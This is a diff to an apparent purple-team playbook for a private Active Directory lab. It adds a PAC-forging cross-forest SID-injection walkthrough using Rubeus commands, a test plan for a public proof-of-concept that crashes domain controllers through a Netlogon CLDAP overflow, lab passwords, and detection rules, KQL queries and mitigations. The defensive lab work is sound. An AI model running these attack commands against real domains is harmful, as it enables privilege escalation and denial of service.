+  3. **Delete or corrupt PAC signatures** (so verification fails)
+  4. Submit forged TGT to Forest B's DC
+  5. DC signature verification fails → enters downgrade mode
+  6. Downgrade mode rebuilds token BUT keeps forged SIDs (SID filter OFF)
+  7. **Attacker becomes Domain Admin in Forest B**
+
+**CADRE applicability: HIGH** (all pre-conditions met):
+- ✅ 2 forests (cadre.local, range.local) with cross-forest trust
+- ✅ **SID Filter OFF** (verified in `01-core-ad.yml:50`)
+- ✅ Attacker controls user in one forest (e.g., `intern_blue` in child.cadre.local)
+- ✅ Target forest has user with same name OR SID injection allowed
+
+**Skipjack vs current Phase 8 (Golden Ticket):**
+| Method | Mechanism | Requires krbtgt hash? | Detection surface |
+|---|---|---|---|
+| Golden Ticket (current Phase 8) | Forge TGT with krbtgt hash + SID history | ✅ Yes (DCSync first) | Anomalous ticket encryption, no legitimate AS-REQ |
+| **Skipjack (new)** | Modify legitimate TGT + corrupt signatures + inject SID | ❌ **No** | Legitimate AS-REQ + 4826 PAC verification failed |
+
+**Test plan (gated on custom tool):**
+```bash
+# Step 1: Get legitimate TGT in child.cadre.local (Forest A)
+# From Kali as intern_blue
+getTGT.py child.cadre.local/intern_blue:'1nt3rn_Blu3!' -dc-ip 192.168.77.11
+# Or Rubeus on mbr01
+Rubeus.exe asktgt /user:intern_blue /password:'1nt3rn_Blu3!' /domain:child.cadre.local /dc:DC02.child.cadre.local /enctype:aes256
+
+# Step 2: Modify PAC — inject S-1-5-21-<cadre.local-domain>-519 (Enterprise Admins)
+# AND delete/corrupt PAC signatures
+# (requires custom Rubeus build or skipjack_forge.py implementation)
+
+Rubeus.exe asktgt /user:intern_blue /password:'1nt3rn_Blu3!' /domain:child.cadre.local \
+  /injectSID:S-1-5-21-<cadre.local-domain>-519 /corruptSignature
+# (Rubeus needs custom compile for /corruptSignature flag)
+
+# Step 3: Submit forged TGT to target forest (cadre.local root DC)
+Rubeus.exe asktgs /service:cifs/DC01.cadre.local /ticket:doIF... /ptt
+
+# Step 4: Verify Domain Admin in cadre.local
+Rubeus.exe describe /ticket:doIF...
+# Should show: "Enterprise Admins" group SID present in token
+
+# Step 5: Profit
+dir \\DC01.cadre.local\C$
+```
+
+**Detection:**
+- **WinSec 4826** (PAC verification failed) — primary signal
+- **WinSec 4769** (TGS request) with corrupted PAC data
+- **Zeek kerberos.log** — inter-realm TGT requests with anomalous auth-data
+- **Suricata SID:1000015** extended for PAC signature anomalies
+- **Defender recommended:** `HKLM\System\CurrentControlSet\Services\Kdc\Parameters\KdcValidatePac = 1`
+
+**Why it's a Phase 8 alternative:**
+- Doesn't require DCSync (no krbtgt hash needed)
+- Tests downgrade behavior assumption (currently unverified for CADRE)
+- Complements existing Phase 8 (different mechanism, same outcome: DA in target forest)
+- High stealth if 4826 events not monitored
+
+**Defense (per GhostWolfLab + Microsoft):**
+- **Enable SID filtering** on all cross-forest trusts — closes the attack entirely
+- **Force PAC validation:** Group Policy → `KdcValidatePac = 1`
+- **Monitor 4826 events** (rare in healthy environment — should alert on any)
+- **ESAE** (Enhanced Security Admin Environment) for high-priv accounts
+
+**Status:** ⏳ Pending — needs custom Rubeus build with `/corruptSignature` flag, or `skipjack_forge.py` Python implementation per blog pseudocode. Test in lab after current Phase 8 (Golden Ticket) verified.
+
+**Cross-references:**
+- Campaign_suggestions.md #97 (full entry with mechanism, pre-conditions, references)
+- Item #66 Forest Trust SID Filtering — root cause fix
+- Item #67 CVE-2020-0665 Trust Bypass — related forest trust bypass
+- Phase 8 (Forest Trust Escalation) — current SID injection via Golden Ticket
+
+---
+
 ## Branches (Optional — Explore Adjacent Attack Surfaces)
 
 ---
@@ -1521,6 +2033,8 @@ impacket-secretsdump -just-dc range.local/svc_naa:'N@A_s3rv1c3!'@192.168.77.12
 **Diverges from:** Phase 4 (BloodHound reveals ACEs).
 **Converges to:** Phase 5+ (ACL abuse gives cadre.local DA, accelerating the main chain).
 **Prerequisite:** Any cadre.local domain credential (e.g., `analyst_dfir`, `analyst_cloud`, `hunter_dfir`).
+
+> 💡 **Pre-BloodHound visual scan:** Run [ADeleg](Phase 0 Step 7) first from mbr01 to visually confirm the 14 ACEs are deployed correctly. ADeleg's View by Trustee directly maps to attacker perspective — faster setup than BloodHound, no EDR alerts, and produces report-ready screenshots. Use BloodHound for deep path-finding queries; use ADeleg for visual verification.
 
 The BH data at `/home/vagrant/20260602150159_bloodhound.zip` (cadre.local) was collected with a low-priv account. Load it into BloodHound CE and run:
 
@@ -1677,6 +2191,8 @@ bloodyAD --host 192.168.77.10 -d cadre.local -u chief_command -p 'C0mm@nd_Ch1ef!
 **Diverges from:** Phase 4 (BloodHound reveals ADCS templates).
 **Converges to:** Phase 7 (certificate auth can give DA/EA without SID History).
 **CA Server:** dc01.cadre.local — CA name `cadre-CA`.
+
+> 💡 **Pre-Certipy visual scan:** Run [ADeleg](Phase 0 Step 7) from mbr01 first to visually identify ADCS template misconfigurations (ESC1-8) BEFORE running `certipy find -vulnerable`. ADeleg flags ESC4 (vulnerable template ACLs — WriteOwner/WriteDacl), ESC1 (enrollee supplies subject), ESC2 (any purpose EKU), ESC3 (enrollment agent EKU). Useful for quick triage without triggering Certipy's noisier LDAP queries.
 
 AD CS is deployed on dc01 with **12 in-scope ESC misconfigurations**. Each exploits a different certificate service weakness. Template names in CADRE are prefixed `CADRE-ESC`*.
 
@@ -1928,8 +2444,12 @@ env /bin/sh                                # Shell via env
 - `Replicating Directory Changes` extended right
 - Detection: 4662 events with `AccessMask: 0x100` (Control Access) on `CN=Configuration,DC=...` from non-DC source
 - Zeek `dce_rpc.log` shows `opnum: 3` from non-DC → high signal
+- 🆕 **Property GUID signature:** Event 4662 with property GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` = DS-Replication-Get-Changes. Alert when this GUID is referenced + subject account is NOT a domain controller → canonical DCSync detection. **Add to Elastic KQL:**
+  ```
+  event.code:4662 AND winlog.event_data.PropertyGUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 AND NOT SubjectUserName:*$*
+  ```
 
-**Action item:** Read before Phase 7. Our existing detection rule (cadre-002 DCSync) should fire on these — verify by capturing a real DCSync.
+**Action item:** Read before Phase 7. Our existing detection rule (cadre-002 DCSync) should fire on these — verify by capturing a real DCSync. Add the property GUID filter to Elastic KQL as a high-fidelity secondary signal.
 
 ### Phase 8 — Forest Trust (read BEFORE testing)
 
@@ -1955,6 +2475,39 @@ env /bin/sh                                # Shell via env
 **Source:** [CVE-2020-0665 — dirkjanm.io](https://dirkjanm.io/cve-2020-0665/)
 
 **Action item:** Reference reading only. CVE-2020-0665 is patched in Server 2025. Include in the "what didn't work" section of the campaign post-mortem.
+
+#### 📖 Windows Security Internals (James Forshaw, 2023) — Reference Book for Kerberos + AD
+
+**Why read:** Forshaw (Project Zero) is the leading Windows security researcher. This book provides the deepest available coverage of the Kerberos protocol (Ch 14), AD security descriptors (Ch 11), access tokens (Ch 4), and security auditing (Ch 9). **Direct relevance:**
+- Chapter 14 (Kerberos) explains TGT, TGS-REQ, AS-REP, PAC structure in detail — supports Phase 1 (AS-REP), Phase 2 (Kerberoast), Phase 7 (Golden Ticket), Skipjack (#97), Onelogon (#76)
+- Chapter 11 (Active Directory) explains security descriptors, ACE inheritance, default DACLs — supports Branch A (14 ACEs), Branch B (ADCS CA ACLs)
+- Chapter 9 (Security Auditing) explains SACL configuration — supports plan1.7 detection engineering
+
+**Source:** `CADRE-Courses/NoStarchPress_extract/WindowsSecurityInternals_11172023/` (1.3MB .txt, 19.6MB .html). See Campaign_suggestions.md #100.
+
+**Concrete techniques extracted from this book (see Campaign_suggestions.md):**
+- **#102 dsHeuristics abuse** (Ch 11) — forest-level attribute for AD behavior modification. Read via LDAP in Phase 0.
+- **#103 UAC bit exploitation beyond DONT_REQ_PREAUTH** (Ch 10, 11) — enumerate all 20+ UAC flags (TRUSTED_FOR_DELEGATION, TRUSTED_TO_AUTH_FOR_DELEGATION, DONT_EXPIRE_PASSWORD, etc.) in Phase 0/1/5.
+- **#104 ms-DS-Machine-Account-Quota check** (Ch 11) — pre-flight check before WT007 RBCD (quota > 0 enables path).
+- **#105 SACL/audit policy manipulation** (Ch 9) — DETECT this in plan1.7 (WinSec 4907/4719).
+
+**Action item:** Read **before executing Phase 1, 2, 7, or testing Skipjack/Onelogon** (items #76, #97). PowerShell examples use NtObjectManager module. Treat as the primary reference for Kerberos protocol mechanics in our campaign.
+
+#### 📖 Practical Purple Teaming (Chase Petrey) — Reference Book for Lab + DFIR
+
+**Why read:** Comprehensive guide to running purple team exercises. Direct relevance:
+- Chapter 6 (Collecting Telemetry) — patterns for Suricata/Zeek/Sysmon/WinSec correlation that match our plan1.7
+- Chapter 8 (Atomic Red Team) — execution framework with 1000+ tests that complement our manual CAMPAIGNS.md commands
+- Chapter 9 (Caldera AD Recon) — adversary emulation automation (already in our Track B Parallel Tracks)
+- Chapter 10 (Mythic C2) — C2 operations (relevant to Plan 10 + Loki integration)
+- Chapter 11 (Reporting + Tracking) — directly relevant to our `tracker.md` workflow + DFIR-Nexus case reports
+
+**Source:** `CADRE-Courses/NoStarchPress_extract/Practical_Purple_Teaming-0642572230173/` (725KB .txt, 770KB .html). See Campaign_suggestions.md #101.
+
+**Concrete techniques extracted from this book (see Campaign_suggestions.md):**
+- **#106 Atomic Red Team as validation framework** (Ch 8) — 1000+ pre-built MITRE ATT&CK tests for cross-validation of our manual CAMPAIGNS.md attacks. Run `Invoke-AtomicTest T1003.001,T1558.003,... -ShowDetails` per phase.
+
+**Action item:** Read **before plan1.7 detection engineering work** and **before DFIR-Nexus integration**. Use Ch 6 telemetry patterns + Ch 8 Atomic Red Team tests to validate our detection coverage.
 
 ### How to use this section
 
@@ -2033,5 +2586,107 @@ npm threat emulation on linux01 (Bash) + mbr01 (PowerShell). Detected via auditd
 | F-08 | Repo weaponization (fake tokens to `data.json`) | T1199, T1567     | git exec + file creation                          | npm-008: `git commit containing token-like strings`            |
 | F-09 | Bundle worm chain (`bundle.js` → `/tmp/*.sh`)   | T1059, T1105     | auditd exec chain · Sysmon                        | npm-009: `bundle.js spawns /tmp/*.sh or /tmp/*.ps1`            |
 | F-10 | Webhook exfil (all scenarios — network rule)    | T1567.*          | Zeek `http.log` POST · Suricata                   | npm-010: `POST to non-corporate host with base64 body`         |
+
+---
+
+### G — Pre-Auth DC Exploits (Standalone)
+
+These exercises demonstrate what happens when a critical CVE hits a DC. Run ONLY with snapshots in place — they crash the target. NOT part of main campaign (would short-circuit Phases 1-3).
+
+#### CVE-2026-41089 — Netlogon CLDAP Stack Buffer Overflow (CVSS 9.8 CRITICAL) 🆕 READY
+
+**Source:** https://github.com/0xABCD01/CVE-2026-41089 (PoC by 0xABCD01, 171 stars, 60 forks, MIT license). Cloned to `docs/internal/references/sources/cve-2026-41089/`.
+**CVE:** CVE-2026-41089 (CVSS 9.8 CRITICAL, CWE-121 Stack-based Buffer Overflow, published 2026-05-12 by Microsoft)
+**Tool:** `poc.py` (Python 3.8+, no third-party deps, 299 lines)
+**MITRE:** T1210 (Exploitation of Remote Services) + T1190 (Exploit Public-Facing Application)
+
+**Vulnerability mechanism:**
+- `NlGetLocalPingResponse` allocates a 528-byte stack buffer (`Src[528]`)
+- Hands it to `BuildSamLogonResponse` → calls `NetpLogonPutUnicodeString` to write Unicode strings
+- **Root cause:** `NetpLogonPutUnicodeString` receives max length in **bytes** but treats it as **WCHAR count** → strings occupy 2x expected space
+- "User" field in CLDAP filter (130 wchars = 260 bytes on wire) + other strings overflow the buffer
+- LSASS crashes → DC reboots in ~60 seconds
+
+**Affected systems (CADRE DCs presumed vulnerable):**
+| Server | Fixed In |
+|--------|----------|
+| 2012 / 2012 R2 | ESU-only patches |
+| 2016 | 10.0.14393.9140 |
+| 2019 | 10.0.17763.8755 |
+| 2022 | 10.0.20348.5074 |
+| 2022 23H2 | 10.0.25398.2330 |
+| **2025** | **10.0.26100.32772** |
+
+**Attack vector:** UDP 389 (CLDAP), pre-authentication, **zero credentials required**, single crafted UDP packet.
+
+**Pre-test checklist (CRITICAL — don't crash a production DC):**
+- [ ] Snapshot dc01, dc02, dc03 before testing (VMware `vmrun.exe snapshot`)
+- [ ] Verify DC patch level on each: `Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name CurrentBuild, UBR` (Server 2025 fixed: 10.0.26100.32772)
+- [ ] Test target = **dc02 FIRST** (child domain DC, less critical than dc01)
+- [ ] UDP/389 reachable from Kali to target DC (`nmap -sU -p 389 192.168.77.11`)
+- [ ] Notify team DC will be down ~60 seconds during test
+- [ ] Prepare for `Reset-ComputerMachinePassword` cleanup if needed
+
+**Test plan:**
+```bash
+# On Kali
+cd docs/internal/references/sources/cve-2026-41089
+
+# Phase 1: connectivity check (short username, no overflow)
+python3 poc.py 192.168.77.11 child.cadre.local
+# Expected: DC responded. Target is alive.
+
+# Phase 2: overflow attempt (130-char username by default)
+python3 poc.py 192.168.77.11 child.cadre.local -l 130
+# Expected: No response. LSASS may have crashed.
+
+# Phase 3: liveness check (auto after 3s delay)
+# If DC is dead: "DC is not responding. LSASS likely crashed. Expect reboot in ~60s."
+```
+
+**Expected behavior:**
+- **If vulnerable (build < 10.0.26100.32772):** DC's LSASS crashes → no UDP/389 response → DC reboots in ~60s
+- **If patched (build >= 10.0.26100.32772):** DC stays alive → no crash → "Try a larger payload: -l 180"
+
+**Telemetry to capture during attack:**
+- **Network:** Zeek `udp.log` (CLDAP traffic on port 389) + `udp` notice for oversized search filter
+- **Network:** Suricata (new rule candidate for CLDAP overflow pattern — oversized User attribute)
+- **Host:** WinSec 1000 (Application Error — `netlogon.dll` crash) on target DC
+- **Host:** WinSec 5805 (The LSASS process was terminated)
+- **Host:** Sysmon EID 1 (process creation on DC after reboot — may show exploit-related processes if any persist)
+- **Host:** Enable Netlogon debug logging pre-test: `nltest /dbflag:0x2080ffff`
+
+**Detection rules to build (post-test):**
+- **Suricata new rule (proposed SID:1000100):** Alert on CLDAP search requests where `User` filter attribute > 20-30 characters
+  ```
+  alert udp any any -> any 389 (msg:"CADRE CVE-2026-41089 Netlogon CLDAP overflow attempt - oversized User attribute"; \
+    content:"|A3 04|User"; pcre:"/User\x04[\x81\x82\x83]?[\x50-\xFF]/"; \
+    sid:1000100; rev:1;)
+  ```
+- **Zeek new script `cadre-cldap.zeek`:** Watch for CLDAP search requests with oversized `User` attribute
+- **Elastic KQL (WinSec 1000 with netlogon.dll):** `event.code:1000 AND winlog.event_data.SourceName:netlogon`
+- **Suricata SID for UDP/389 flood:** Optional — multi-packet detection of CLDAP scanning
+
+**Post-test:**
+- Promote CAMPAIGNS-METADATA.md Mechanics section from STUB to TESTED with actual telemetry
+- Update CAMPAIGNS.md WT status from 🆕 to ✅ (if worked) or ❌ Patched (if build >= 32772)
+- Document outcome in `docs/internal/plan01-telemetry-catalog/phase1-source-matrix/tracker.md` (post-campaign)
+- Add to `plan1.7` defense deepening as detection engineering deliverable
+- Cross-reference: Item #65 Zerologon Alternative (superseded), Item #76 Onelogon (also exploits Netlogon but different vuln class)
+
+**Mitigation (if vulnerable — for production hardening reference):**
+- Install May 2026 Microsoft security update (build 10.0.26100.32772)
+- Restrict UDP 389 inbound to trusted management subnets (firewall rule)
+- 0patch ships micropatches for legacy Server versions (single instruction fix: `mov edx, 0x40` to halve max username length)
+
+**Why standalone (not main campaign):**
+- Unauthenticated DC compromise would short-circuit the entire credential chain (Phases 1-3 become unnecessary)
+- CADRE's main campaign demonstrates misconfiguration-based attacks, not CVE exploits
+- But valuable as a standalone exercise: tests detection of Netlogon exploitation, shows what happens when a critical CVE hits
+
+**Cross-references:**
+- Campaign_suggestions.md #33 (full entry with PoC details, detection rules, mitigation)
+- Campaign_suggestions.md #76 Onelogon Zero-Channel (different Netlogon vuln class — also bypasses post-Zerologon hardening)
+- Item #65 Zerologon Alternative — superseded by CVE-2026-41089 + Onelogon
 
 
